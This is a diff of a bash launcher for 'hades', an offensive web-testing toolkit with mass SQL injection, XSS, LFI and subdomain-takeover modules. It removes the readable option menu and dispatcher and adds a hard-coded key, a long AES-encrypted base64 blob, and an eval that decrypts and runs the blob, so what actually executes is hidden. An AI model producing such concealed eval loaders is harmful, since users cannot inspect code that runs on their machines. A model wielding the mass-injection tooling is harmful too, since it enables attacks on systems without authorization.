@@ -1,66 +1,63 @@
-#!/usr/bin/bash
-
-# Color Definitions
-RED='\e[31m'
-CYAN='\e[36m'
-GREEN='\e[32m'
-YELLOW='\e[93m'
-RESET='\e[0m'
-
-
-# Function to display help message
-display_help() {
-    echo -e "$CYAN"
-    echo -e "Usage: ./hades [options]"
-    echo -e "Created by $GREEN joelindra | $YELLOW Linkedin: joelindra $RESET"
-    echo -e "\nAvailable Options:"
-    echo -e "  $CYAN-s, $GREEN --single-recon        $CYAN Single Recon"
-    echo -e "  $CYAN-d, $GREEN --mass-recon          $CYAN Mass Recon"
-    echo -e "  $CYAN-l, $GREEN --mass-js-finder      $CYAN Mass JS Finder"
-    echo -e "  $CYAN-o, $GREEN --single-sql-inject   $CYAN Single SQL Injection"
-    echo -e "  $CYAN-p, $GREEN --mass-sql-inject     $CYAN Mass SQL Injection"
-    echo -e "  $CYAN-x, $GREEN --single-xss          $CYAN Single XSS Injection"
-    echo -e "  $CYAN-w, $GREEN --mass-xss            $CYAN Mass XSS Injection"
-    echo -e "  $CYAN-n, $GREEN --single-lfi          $CYAN Single LFI Injection"
-    echo -e "  $CYAN-m, $GREEN --mass-assessment     $CYAN Mass Assessment"
-    echo -e "  $CYAN-y, $GREEN --sub-takeover        $CYAN Subdomain Takeover"
-    echo -e "  $CYAN-q, $GREEN --dirsearch-patrol    $CYAN Dirsearch Patrol"
-    echo -e "  $CYAN-k, $GREEN --apk-enum            $CYAN APK Enumeration"
-    echo -e "  $CYAN-v, $GREEN --mass-dom-xss        $CYAN Mass DOM XSS Exploit"
-    echo -e "  $CYAN-i, $GREEN --install-requirements$CYAN Install Requirements (Important)"
-    echo -e "  $CYAN-h, $GREEN --help                $CYAN Display this help message"
-    echo -e "$RESET"
-}
-
-# Function to handle the main logic based on options
-handle_option() {
-    case "$1" in
-        -s|--single-recon) source "./function/singlerecon.sh" ;;
-        -d|--mass-recon) source "./function/massrecon.sh" ;;
-        -l|--mass-js-finder) source "./function/massjsfinder.sh" ;;
-        -o|--single-sql-inject) source "./function/ssqlinject.sh" ;;
-        -p|--mass-sql-inject) source "./function/masssqlinject.sh" ;;
-        -x|--single-xss) source "./function/singlexss.sh" ;;
-        -w|--mass-xss) source "./function/massxss.sh" ;;
-        -n|--single-lfi) source "./function/singlelfi.sh" ;;
-        -m|--mass-assessment) source "./function/massassessment.sh" ;;
-        -y|--sub-takeover) source "./function/subover.sh" ;;
-        -q|--dirsearch-patrol) source "./function/dirsearchpatrol.sh" ;;
-        -k|--apk-enum) source "./function/apkenum.sh" ;;
-        -v|--mass-dom-xss) source "./function/massdomxss.sh" ;;
-        -i|--install-requirements) source "./function/installreq.sh" ;;
-        -h|--help) display_help; exit 0 ;;
-        *) echo -e "${RED}Invalid option: $1${RESET}"; display_help; exit 1 ;;
-    esac
-}
-
-# Main program starts here
-if [[ $# -eq 0 ]]; then
-    display_help
-    exit 0
-fi
-
-# Loop through options passed to the script
-for option in "$@"; do
-    handle_option "$option"
-done
+#!/bin/bash
+key="679f05000daae1f045f714a41190ce62"
+encoded_code="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"
+eval "$(echo -n "$encoded_code" | openssl enc -d -aes-256-cbc -pbkdf2 -base64 -k "$key")"
